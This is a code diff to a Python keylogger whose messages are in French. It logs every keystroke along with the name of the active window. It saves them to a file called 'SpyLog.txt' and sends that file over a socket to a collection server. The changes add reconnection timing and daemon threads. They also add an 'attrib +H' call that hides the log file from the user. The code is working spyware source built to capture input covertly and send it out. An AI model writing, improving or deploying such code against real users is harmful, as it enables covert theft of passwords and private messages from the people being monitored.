@@ -1,5 +1,6 @@
 from pynput import keyboard
 from datetime import datetime
+import subprocess
 import threading
 import platform
 import pygetwindow as gw
@@ -9,7 +10,7 @@ import sys
 
 host, port = ("localhost", 9998)
 today = datetime.now()
-
+running = True
 
 def get_active_app():
     current_os = platform.system()
@@ -33,14 +34,23 @@ def get_active_app():
         return "Unknown OS"
     
 def socket_connection(host, port, today):
+    global running
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while True:
+    server_unreachable = True
+    while (datetime.now() - today).seconds < 600:
         try:
             client.connect((host, port))
+            server_unreachable = False
             send_file(client, today)
             break
         except Exception as e:
             print(f"Le serveur ne répond pas, tentative de reconnexion ... {e}")
+            time.sleep(5)
+
+    if server_unreachable:
+        print("Le serveur est injoignable.")
+        running = False
+        sys.exit()
 
 def send_file(client, today):
     while True:
@@ -93,6 +103,9 @@ def get_app_from_file():
         return get_active_app()
 
 def on_press(key):
+    global running
+    if not running:
+        return False
     app_now = get_active_app()
     try:
         write_to_file('{0}'.format(key.char), app_now)
@@ -121,6 +134,7 @@ def write_to_file(key, app):
                 log.write("\n")
                 
             log.write(f"{key} -> {app}\n")
+        subprocess.call(['attrib', '+H', 'SpyLog.txt'])
 
 def launch_key_logger():
     with keyboard.Listener(on_press=on_press) as listener:
@@ -128,8 +142,8 @@ def launch_key_logger():
 
 if __name__ == '__main__':
     try:
-        srv_socket_thread = threading.Thread(target=socket_connection, args=(host, port, today))
-        key_logger_thread = threading.Thread(target=launch_key_logger)
+        srv_socket_thread = threading.Thread(target=socket_connection, args=(host, port, today), daemon=True)
+        key_logger_thread = threading.Thread(target=launch_key_logger, daemon=True)
         
         key_logger_thread.start()
         srv_socket_thread.start()
